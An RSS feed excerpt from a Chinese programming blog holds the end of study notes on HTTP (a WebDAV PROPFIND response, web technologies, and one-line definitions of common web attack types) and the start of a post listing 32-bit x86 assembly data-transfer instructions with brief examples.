&lt;p&gt;下面是针对之前的 PROPFIND 方法，返回&lt;a href=&#34;http://www.example.com/file&#34;&gt;http://www.example.com/file &lt;/a&gt;的属性的响应。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token response-status&#34;&gt;&lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;token status-code number&#34;&gt;207&lt;/span&gt; &lt;span class=&#34;token reason-phrase string&#34;&gt;Multi-Status&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;application/xml; charset=&#34;utf-8&#34; Content-Length: 831&lt;/span&gt;&lt;/span&gt;

&amp;lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34; ?&amp;gt;
&amp;lt;D:multistatus xmlns:D=&#34;DAV:&#34;&amp;gt;
&amp;lt;D:response xmlns:R=&#34;http://ns.example.com/boxschema/&#34;
&amp;lt;D:href&amp;gt;http://www.example.com/file&amp;lt;/D:href&amp;gt;
&amp;lt;D:propstat&amp;gt;
&amp;lt;D:prop&amp;gt;
&amp;lt;R:bigbox&amp;gt;
&amp;lt;R:BoxType&amp;gt;Box type A&amp;lt;/R:BoxType&amp;gt;
&amp;lt;/R:bigbox&amp;gt;
&amp;lt;R:author&amp;gt;
&amp;lt;R:Name&amp;gt;J.J. Johnson&amp;lt;/R:Name&amp;gt;
&amp;lt;/R:author&amp;gt;
&amp;lt;/D:prop&amp;gt;
&amp;lt;D:status&amp;gt;HTTP/1.1 200 OK&amp;lt;/D:status&amp;gt;
&amp;lt;/D:propstat&amp;gt;
&amp;lt;D:propstat&amp;gt;
&amp;lt;D:prop&amp;gt;&amp;lt;R:DingALing/&amp;gt;&amp;lt;R:Random/&amp;gt;&amp;lt;/D:prop&amp;gt;
&amp;lt;D:status&amp;gt;HTTP/1.1 403 Forbidden&amp;lt;/D:status&amp;gt;
&amp;lt;D:responsedescription&amp;gt; The user does not have acc
&amp;lt;/D:responsedescription&amp;gt;
&amp;lt;/D:propstat&amp;gt;
&amp;lt;/D:response&amp;gt;
&amp;lt;D:responsedescription&amp;gt; There has been an access viola
&amp;lt;/D:responsedescription&amp;gt;
&amp;lt;/D:multistatus&amp;gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;构建-Web-内容的技术&#34;&gt;&lt;a href=&#34;#构建-Web-内容的技术&#34; class=&#34;headerlink&#34; title=&#34;构建 Web 内容的技术&#34;&gt;&lt;/a&gt;构建 &lt;strong&gt;Web&lt;/strong&gt; 内容的技术&lt;/h2&gt;&lt;h3 id=&#34;HTML&#34;&gt;&lt;a href=&#34;#HTML&#34; class=&#34;headerlink&#34; title=&#34;HTML&#34;&gt;&lt;/a&gt;HTML&lt;/h3&gt;&lt;h5 id=&#34;Web-页面几乎全由-HTML-构建&#34;&gt;&lt;a href=&#34;#Web-页面几乎全由-HTML-构建&#34; class=&#34;headerlink&#34; title=&#34;Web 页面几乎全由 HTML 构建&#34;&gt;&lt;/a&gt;&lt;strong&gt;Web&lt;/strong&gt; 页面几乎全由 &lt;strong&gt;HTML&lt;/strong&gt; 构建&lt;/h5&gt;&lt;h5 id=&#34;HTML版本&#34;&gt;&lt;a href=&#34;#HTML版本&#34; class=&#34;headerlink&#34; title=&#34;HTML版本&#34;&gt;&lt;/a&gt;HTML版本&lt;/h5&gt;&lt;h5 id=&#34;设计应用-CSS&#34;&gt;&lt;a href=&#34;#设计应用-CSS&#34; class=&#34;headerlink&#34; title=&#34;设计应用 CSS&#34;&gt;&lt;/a&gt;设计应用 &lt;strong&gt;CSS&lt;/strong&gt;&lt;/h5&gt;&lt;h4 id=&#34;动态HTML&#34;&gt;&lt;a href=&#34;#动态HTML&#34; class=&#34;headerlink&#34; title=&#34;动态HTML&#34;&gt;&lt;/a&gt;动态HTML&lt;/h4&gt;&lt;p&gt;使用客户端脚本语言将静态的 HTML 内容变成动态的技术的总称。&lt;/p&gt;
&lt;h5 id=&#34;DOM&#34;&gt;&lt;a href=&#34;#DOM&#34; class=&#34;headerlink&#34; title=&#34;DOM&#34;&gt;&lt;/a&gt;DOM&lt;/h5&gt;&lt;p&gt;DOM 是用以操作 HTML 文档和 XML 文档的 API（Application Programming Interface，应用编程接口）。&lt;/p&gt;
&lt;p&gt;Web应用&lt;/p&gt;
&lt;h4 id=&#34;通过-Web-提供功能的-Web-应用&#34;&gt;&lt;a href=&#34;#通过-Web-提供功能的-Web-应用&#34; class=&#34;headerlink&#34; title=&#34;通过 Web 提供功能的 Web 应用&#34;&gt;&lt;/a&gt;通过 &lt;strong&gt;Web&lt;/strong&gt; 提供功能的 &lt;strong&gt;Web&lt;/strong&gt; 应用&lt;/h4&gt;&lt;p&gt;由程序创建的内容称为动态内容，而事先准备好的内容称为静态内容。&lt;/p&gt;
&lt;h4 id=&#34;与-Web-服务器及程序协作的-CGI&#34;&gt;&lt;a href=&#34;#与-Web-服务器及程序协作的-CGI&#34; class=&#34;headerlink&#34; title=&#34;与 Web 服务器及程序协作的 CGI&#34;&gt;&lt;/a&gt;与 &lt;strong&gt;Web&lt;/strong&gt; 服务器及程序协作的 &lt;strong&gt;CGI&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;CGI（Common Gateway Interface，通用网关接口）是指 Web 服务器在接收到客户端发送过来的请求后转发给程序的一组机制。在 CGI 的作用下，程序会对请求内容做出相应的动作，比如创建 HTML 等动态内容。&lt;/p&gt;
&lt;p&gt;使用 CGI 的程序叫做 CGI 程序，通常是用 Perl、PHP、Ruby 和 C 等编程语言编写而成。&lt;/p&gt;
&lt;h4 id=&#34;因-Java-而普及的-Servlet&#34;&gt;&lt;a href=&#34;#因-Java-而普及的-Servlet&#34; class=&#34;headerlink&#34; title=&#34;因 Java 而普及的 Servlet&#34;&gt;&lt;/a&gt;因 &lt;strong&gt;Java&lt;/strong&gt; 而普及的 &lt;strong&gt;Servlet&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;Servlet 是一种能在服务器上创建动态内容的程序。Servlet 是用 Java 语言实现的一个接口，属于面向企业级 Java（JavaEE，Java Enterprise Edition）的一部分。负载小。&lt;/p&gt;
&lt;h3 id=&#34;数据发布的格式及语言&#34;&gt;&lt;a href=&#34;#数据发布的格式及语言&#34; class=&#34;headerlink&#34; title=&#34;数据发布的格式及语言&#34;&gt;&lt;/a&gt;数据发布的格式及语言&lt;/h3&gt;&lt;h4 id=&#34;可扩展标记语言&#34;&gt;&lt;a href=&#34;#可扩展标记语言&#34; class=&#34;headerlink&#34; title=&#34;可扩展标记语言&#34;&gt;&lt;/a&gt;可扩展标记语言&lt;/h4&gt;&lt;p&gt;XML（eXtensible Markup Language，可扩展标记语言）是一种可按应用目标进行扩展的通用标记语言。旨在通过使用 XML，使互联网数据共享变得更容易。&lt;/p&gt;
&lt;p&gt;XML 和 HTML 都是从标准通用标记语言 SGML（Standard Generalized Markup Language）简化而成。与 HTML 相比，它对数据的记录方式做了特殊处理。&lt;/p&gt;
&lt;h4 id=&#34;发布更新信息的-RSS-Atom&#34;&gt;&lt;a href=&#34;#发布更新信息的-RSS-Atom&#34; class=&#34;headerlink&#34; title=&#34;发布更新信息的 RSS/Atom&#34;&gt;&lt;/a&gt;发布更新信息的 &lt;strong&gt;RSS/Atom&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;RSS（简易信息聚合，也叫聚合内容）和 Atom 都是发布新闻或博客日志等更新信息文档的格式的总称。两者都用到了 XML。&lt;/p&gt;
&lt;h4 id=&#34;JavaScript-衍生的轻量级易用-JSON&#34;&gt;&lt;a href=&#34;#JavaScript-衍生的轻量级易用-JSON&#34; class=&#34;headerlink&#34; title=&#34;JavaScript 衍生的轻量级易用 JSON&#34;&gt;&lt;/a&gt;&lt;strong&gt;JavaScript&lt;/strong&gt; 衍生的轻量级易用 &lt;strong&gt;JSON&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;JSON（JavaScript Object Notation）是一种以JavaScript（ECMAScript）的对象表示法为基础的轻量级数据标记语言。&lt;/p&gt;
&lt;h2 id=&#34;Web-的攻击技术&#34;&gt;&lt;a href=&#34;#Web-的攻击技术&#34; class=&#34;headerlink&#34; title=&#34;Web 的攻击技术&#34;&gt;&lt;/a&gt;&lt;strong&gt;Web&lt;/strong&gt; 的攻击技术&lt;/h2&gt;&lt;h3 id=&#34;针对-Web-的攻击技术&#34;&gt;&lt;a href=&#34;#针对-Web-的攻击技术&#34; class=&#34;headerlink&#34; title=&#34;针对 Web 的攻击技术&#34;&gt;&lt;/a&gt;针对 &lt;strong&gt;Web&lt;/strong&gt; 的攻击技术&lt;/h3&gt;&lt;h4 id=&#34;HTTP-不具备必要的安全功能&#34;&gt;&lt;a href=&#34;#HTTP-不具备必要的安全功能&#34; class=&#34;headerlink&#34; title=&#34;HTTP 不具备必要的安全功能&#34;&gt;&lt;/a&gt;&lt;strong&gt;HTTP&lt;/strong&gt; 不具备必要的安全功能&lt;/h4&gt;&lt;h4 id=&#34;在客户端即可篡改请求&#34;&gt;&lt;a href=&#34;#在客户端即可篡改请求&#34; class=&#34;headerlink&#34; title=&#34;在客户端即可篡改请求&#34;&gt;&lt;/a&gt;在客户端即可篡改请求&lt;/h4&gt;&lt;h4 id=&#34;针对-Web-应用的攻击模式&#34;&gt;&lt;a href=&#34;#针对-Web-应用的攻击模式&#34; class=&#34;headerlink&#34; title=&#34;针对 Web 应用的攻击模式&#34;&gt;&lt;/a&gt;针对 &lt;strong&gt;Web&lt;/strong&gt; 应用的攻击模式&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;主动攻击&lt;/li&gt;
&lt;li&gt;被动攻击&lt;/li&gt;
&lt;li&gt;以服务器为目标的主动攻击&lt;/li&gt;
&lt;li&gt;以服务器为目标的被动攻&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;因输出值转义不完全引发的安全漏洞&#34;&gt;&lt;a href=&#34;#因输出值转义不完全引发的安全漏洞&#34; class=&#34;headerlink&#34; title=&#34;因输出值转义不完全引发的安全漏洞&#34;&gt;&lt;/a&gt;因输出值转义不完全引发的安全漏洞&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;客户端的验证&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Web&lt;/strong&gt; 应用端（服务器端）的验证&lt;ul&gt;
&lt;li&gt;输入值验证&lt;/li&gt;
&lt;li&gt;输出值转义&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;跨站脚本攻击（Cross-Site-Scripting，XSS）&#34;&gt;&lt;a href=&#34;#跨站脚本攻击（Cross-Site-Scripting，XSS）&#34; class=&#34;headerlink&#34; title=&#34;跨站脚本攻击（Cross-Site Scripting，XSS）&#34;&gt;&lt;/a&gt;跨站脚本攻击（Cross-Site Scripting，XSS）&lt;/h4&gt;&lt;p&gt;跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。&lt;/p&gt;
&lt;h4 id=&#34;SQL-注入（SQL-Injection）&#34;&gt;&lt;a href=&#34;#SQL-注入（SQL-Injection）&#34; class=&#34;headerlink&#34; title=&#34;SQL 注入（SQL Injection）&#34;&gt;&lt;/a&gt;SQL 注入（SQL Injection）&lt;/h4&gt;&lt;h4 id=&#34;OS-命令注入攻击（OS-Command-Injection）&#34;&gt;&lt;a href=&#34;#OS-命令注入攻击（OS-Command-Injection）&#34; class=&#34;headerlink&#34; title=&#34;OS 命令注入攻击（OS Command Injection）&#34;&gt;&lt;/a&gt;OS 命令注入攻击（OS Command Injection）&lt;/h4&gt;&lt;h4 id=&#34;HTTP-首部注入攻击（HTTP-Header-Injection）&#34;&gt;&lt;a href=&#34;#HTTP-首部注入攻击（HTTP-Header-Injection）&#34; class=&#34;headerlink&#34; title=&#34;HTTP 首部注入攻击（HTTP Header Injection）&#34;&gt;&lt;/a&gt;HTTP 首部注入攻击（HTTP Header Injection）&lt;/h4&gt;&lt;h4 id=&#34;邮件首部注入（Mail-Header-Injection）&#34;&gt;&lt;a href=&#34;#邮件首部注入（Mail-Header-Injection）&#34; class=&#34;headerlink&#34; title=&#34;邮件首部注入（Mail Header Injection）&#34;&gt;&lt;/a&gt;邮件首部注入（Mail Header Injection）&lt;/h4&gt;&lt;h4 id=&#34;目录遍历（Directory-Traversal）攻击&#34;&gt;&lt;a href=&#34;#目录遍历（Directory-Traversal）攻击&#34; class=&#34;headerlink&#34; title=&#34;目录遍历（Directory Traversal）攻击&#34;&gt;&lt;/a&gt;目录遍历（Directory Traversal）攻击&lt;/h4&gt;&lt;h4 id=&#34;远程文件包含漏洞（Remote-File-Inclusion）&#34;&gt;&lt;a href=&#34;#远程文件包含漏洞（Remote-File-Inclusion）&#34; class=&#34;headerlink&#34; title=&#34;远程文件包含漏洞（Remote File Inclusion）&#34;&gt;&lt;/a&gt;远程文件包含漏洞（Remote File Inclusion）&lt;/h4&gt;&lt;h3 id=&#34;因设置或设计上的缺陷引发的安全漏洞&#34;&gt;&lt;a href=&#34;#因设置或设计上的缺陷引发的安全漏洞&#34; class=&#34;headerlink&#34; title=&#34;因设置或设计上的缺陷引发的安全漏洞&#34;&gt;&lt;/a&gt;因设置或设计上的缺陷引发的安全漏洞&lt;/h3&gt;&lt;h4 id=&#34;强制浏览（Forced-Browsing）&#34;&gt;&lt;a href=&#34;#强制浏览（Forced-Browsing）&#34; class=&#34;headerlink&#34; title=&#34;强制浏览（Forced Browsing）&#34;&gt;&lt;/a&gt;强制浏览（Forced Browsing）&lt;/h4&gt;&lt;p&gt;强制浏览（Forced Browsing）安全漏洞是指，从安置在 Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。&lt;/p&gt;
&lt;h4 id=&#34;不正确的错误消息处理（Error-Handling-Vulnerability）&#34;&gt;&lt;a href=&#34;#不正确的错误消息处理（Error-Handling-Vulnerability）&#34; class=&#34;headerlink&#34; title=&#34;不正确的错误消息处理（Error Handling Vulnerability）&#34;&gt;&lt;/a&gt;不正确的错误消息处理（Error Handling Vulnerability）&lt;/h4&gt;&lt;p&gt;不正确的错误消息处理（Error Handling Vulnerability）的安全漏洞是指，Web 应用的错误信息内包含对攻击者有用的信息。&lt;/p&gt;
&lt;h4 id=&#34;开放重定向（Open-Redirect）&#34;&gt;&lt;a href=&#34;#开放重定向（Open-Redirect）&#34; class=&#34;headerlink&#34; title=&#34;开放重定向（Open Redirect）&#34;&gt;&lt;/a&gt;开放重定向（Open Redirect）&lt;/h4&gt;&lt;p&gt;开放重定向（Open Redirect）是一种对指定的任意 URL 作重定向跳转的功能。而于此功能相关联的安全漏洞是指，假如指定的重定向 URL 到某个具有恶意的 Web 网站，那么用户就会被诱导至那个 Web 网站。&lt;/p&gt;
&lt;h3 id=&#34;因会话管理疏忽引发的安全漏洞&#34;&gt;&lt;a href=&#34;#因会话管理疏忽引发的安全漏洞&#34; class=&#34;headerlink&#34; title=&#34;因会话管理疏忽引发的安全漏洞&#34;&gt;&lt;/a&gt;因会话管理疏忽引发的安全漏洞&lt;/h3&gt;&lt;h4 id=&#34;会话劫持（Session-Hijack）&#34;&gt;&lt;a href=&#34;#会话劫持（Session-Hijack）&#34; class=&#34;headerlink&#34; title=&#34;会话劫持（Session Hijack）&#34;&gt;&lt;/a&gt;会话劫持（Session Hijack）&lt;/h4&gt;&lt;p&gt;会话劫持（Session Hijack）是指攻击者通过某种手段拿到了用户的会话 ID，并非法使用此会话 ID 伪装成用户，达到攻击的目的。&lt;/p&gt;
&lt;h4 id=&#34;会话固定攻击&#34;&gt;&lt;a href=&#34;#会话固定攻击&#34; class=&#34;headerlink&#34; title=&#34;会话固定攻击&#34;&gt;&lt;/a&gt;会话固定攻击&lt;/h4&gt;&lt;p&gt;对以窃取目标会话 ID 为主动攻击手段的会话劫持而言，会话固定攻击（Session Fixation）攻击会强制用户使用攻击者指定的会话 ID，属于被动攻击。&lt;/p&gt;
&lt;h4 id=&#34;跨站点请求伪造（Cross-Site-Request-Forgeries，CSRF）&#34;&gt;&lt;a href=&#34;#跨站点请求伪造（Cross-Site-Request-Forgeries，CSRF）&#34; class=&#34;headerlink&#34; title=&#34;跨站点请求伪造（Cross-Site Request Forgeries，CSRF）&#34;&gt;&lt;/a&gt;跨站点请求伪造（Cross-Site Request Forgeries，CSRF）&lt;/h4&gt;&lt;p&gt;跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。&lt;/p&gt;
&lt;h3 id=&#34;其他安全漏洞&#34;&gt;&lt;a href=&#34;#其他安全漏洞&#34; class=&#34;headerlink&#34; title=&#34;其他安全漏洞&#34;&gt;&lt;/a&gt;其他安全漏洞&lt;/h3&gt;&lt;h4 id=&#34;密码破解攻击（Password-Cracking）&#34;&gt;&lt;a href=&#34;#密码破解攻击（Password-Cracking）&#34; class=&#34;headerlink&#34; title=&#34;密码破解攻击（Password Cracking）&#34;&gt;&lt;/a&gt;密码破解攻击（Password Cracking）&lt;/h4&gt;&lt;p&gt;密码破解攻击（Password Cracking）即算出密码，突破认证。&lt;/p&gt;
&lt;h4 id=&#34;点击劫持（Clickjacking）&#34;&gt;&lt;a href=&#34;#点击劫持（Clickjacking）&#34; class=&#34;headerlink&#34; title=&#34;点击劫持（Clickjacking）&#34;&gt;&lt;/a&gt;点击劫持（Clickjacking）&lt;/h4&gt;&lt;p&gt;点击劫持（Clickjacking）是指利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装（UI Redressing）。&lt;/p&gt;
&lt;h4 id=&#34;DoS-攻击（Denial-of-Service-attack）&#34;&gt;&lt;a href=&#34;#DoS-攻击（Denial-of-Service-attack）&#34; class=&#34;headerlink&#34; title=&#34;DoS 攻击（Denial of Service attack）&#34;&gt;&lt;/a&gt;DoS 攻击（Denial of Service attack）&lt;/h4&gt;&lt;p&gt;DoS 攻击（Denial of Service attack）是一种让运行中的服务呈停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS 攻击的对象不仅限于 Web 网站，还包括网络设备及服务器等。&lt;/p&gt;
&lt;h4 id=&#34;后门程序（Backdoor）&#34;&gt;&lt;a href=&#34;#后门程序（Backdoor）&#34; class=&#34;headerlink&#34; title=&#34;后门程序（Backdoor）&#34;&gt;&lt;/a&gt;后门程序（Backdoor）&lt;/h4&gt;&lt;p&gt;后门程序（Backdoor）是指开发设置的隐藏入口，可不按正常步骤使用受限功能。利用后门程序就能够使用原本受限制的功能。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://0xdadream.github.io/2021/01/03/zhi-ling/</guid>
            <title>32位汇编指令总结(代码示例)</title>
            <link>https://0xdadream.github.io/2021/01/03/zhi-ling/</link>
            <category>学习</category>
            <category>汇编</category>
            <pubDate>Sun, 03 Jan 2021 02:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;通用数据传送指令&#34;&gt;&lt;a href=&#34;#通用数据传送指令&#34; class=&#34;headerlink&#34; title=&#34;通用数据传送指令&#34;&gt;&lt;/a&gt;通用数据传送指令&lt;/h1&gt;&lt;h3 id=&#34;MOV-传送字或字节&#34;&gt;&lt;a href=&#34;#MOV-传送字或字节&#34; class=&#34;headerlink&#34; title=&#34;MOV 传送字或字节&#34;&gt;&lt;/a&gt;MOV 传送字或字节&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov al,10h&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;MOVSX-先符号扩展-再传送&#34;&gt;&lt;a href=&#34;#MOVSX-先符号扩展-再传送&#34; class=&#34;headerlink&#34; title=&#34;MOVSX 先符号扩展,再传送&#34;&gt;&lt;/a&gt;MOVSX 先符号扩展,再传送&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;movsx eax,ax;先进行全零扩展,前16位为F&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;MOVZX-先零扩展-再传送&#34;&gt;&lt;a href=&#34;#MOVZX-先零扩展-再传送&#34; class=&#34;headerlink&#34; title=&#34;MOVZX 先零扩展,再传送&#34;&gt;&lt;/a&gt;MOVZX 先零扩展,再传送&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;movzx eax,ax;先进行全零扩展,前16位为0&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;PUSH-把字压入堆栈&#34;&gt;&lt;a href=&#34;#PUSH-把字压入堆栈&#34; class=&#34;headerlink&#34; title=&#34;PUSH 把字压入堆栈&#34;&gt;&lt;/a&gt;PUSH 把字压入堆栈&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;push reg/nem16   32
push imm32&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;POP-把字弹出堆栈&#34;&gt;&lt;a href=&#34;#POP-把字弹出堆栈&#34; class=&#34;headerlink&#34; title=&#34;POP 把字弹出堆栈&#34;&gt;&lt;/a&gt;POP 把字弹出堆栈&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;pop reg/nem16  32&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;PUSHFD-把32EFLAGS寄存器内容压入堆栈&#34;&gt;&lt;a href=&#34;#PUSHFD-把32EFLAGS寄存器内容压入堆栈&#34; class=&#34;headerlink&#34; title=&#34;PUSHFD 把32EFLAGS寄存器内容压入堆栈&#34;&gt;&lt;/a&gt;PUSHFD 把32EFLAGS寄存器内容压入堆栈&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;pushfd;保存标志寄存器内容&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;POPFD-把32EFLAGS寄存器内容弹出堆栈&#34;&gt;&lt;a href=&#34;#POPFD-把32EFLAGS寄存器内容弹出堆栈&#34; class=&#34;headerlink&#34; title=&#34;POPFD 把32EFLAGS寄存器内容弹出堆栈&#34;&gt;&lt;/a&gt;POPFD 把32EFLAGS寄存器内容弹出堆栈&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;popfd;恢复标志寄存器内容&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;PUSHA-把AX-CX-DX-BX-SP-BP-SI-DI依次压入堆栈&#34;&gt;&lt;a href=&#34;#PUSHA-把AX-CX-DX-BX-SP-BP-SI-DI依次压入堆栈&#34; class=&#34;headerlink&#34; title=&#34;PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈&#34;&gt;&lt;/a&gt;PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;pusha;保存16通用寄存器内容&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;POPA-把DI-SI-BP-SP-BX-DX-CX-AX依次弹出堆栈&#34;&gt;&lt;a href=&#34;#POPA-把DI-SI-BP-SP-BX-DX-CX-AX依次弹出堆栈&#34; class=&#34;headerlink&#34; title=&#34;POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈&#34;&gt;&lt;/a&gt;POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;popa;恢复16通用寄存器内存&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;PUSHAD-把EAX-ECX-EDX-EBX-ESP-EBP-ESI-EDI依次压入堆栈&#34;&gt;&lt;a href=&#34;#PUSHAD-把EAX-ECX-EDX-EBX-ESP-EBP-ESI-EDI依次压入堆栈&#34; class=&#34;headerlink&#34; title=&#34;PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈&#34;&gt;&lt;/a&gt;PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;pushad;保存32通用寄存器内容&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;POPAD-把EDI-ESI-EBP-ESP-EBX-EDX-ECX-EAX依次弹出堆栈&#34;&gt;&lt;a href=&#34;#POPAD-把EDI-ESI-EBP-ESP-EBX-EDX-ECX-EAX依次弹出堆栈&#34; class=&#34;headerlink&#34; title=&#34;POPAD 把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈&#34;&gt;&lt;/a&gt;POPAD 把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;popad;恢复32通用寄存器内存&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;BSWAP-交换32位寄存器里字节的顺序&#34;&gt;&lt;a href=&#34;#BSWAP-交换32位寄存器里字节的顺序&#34; class=&#34;headerlink&#34; title=&#34;BSWAP 交换32位寄存器里字节的顺序&#34;&gt;&lt;/a&gt;BSWAP 交换32位寄存器里字节的顺序&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;;EAX=96688368H
BSWAP EAX;EAX=68836896H&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

